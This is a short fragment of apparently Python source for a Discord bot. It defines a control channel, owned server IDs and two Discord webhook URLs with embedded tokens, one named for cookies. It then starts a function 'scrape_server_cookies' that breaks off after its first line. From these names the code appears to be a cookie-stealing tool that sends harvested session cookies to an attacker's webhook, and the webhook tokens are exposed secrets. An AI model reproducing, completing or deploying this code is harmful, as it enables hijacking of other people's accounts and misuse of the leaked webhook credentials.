...
CONTROL_CHANNEL_ID = 1440336334714703923
CONTROL_WEBHOOK_URL = "https://discord.com/api/webhooks/1440375774183161917/bWjpVuOAmRiV2YSN7WaIMiP1m0jz3zXJZCtgLFMJQjUXccjKj5BucvSeKqHPl221hILh"  # Replace with actual webhook URL
COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1440375984867246174/6JLK_zSKzo0cwTUwywOYDT9eadmRLrTeCvPSVkb3SslLhn7Ixlps5cOThj7FcASWPpS4"
OWNED_SERVER_IDS = [1440336266821369886]
SERVER_INVITES = {}
...
async def scrape_server_cookies(interaction, guild):
    """Helper function to scrape cookies from a server"""
    start_time = datetime.datetime.now()
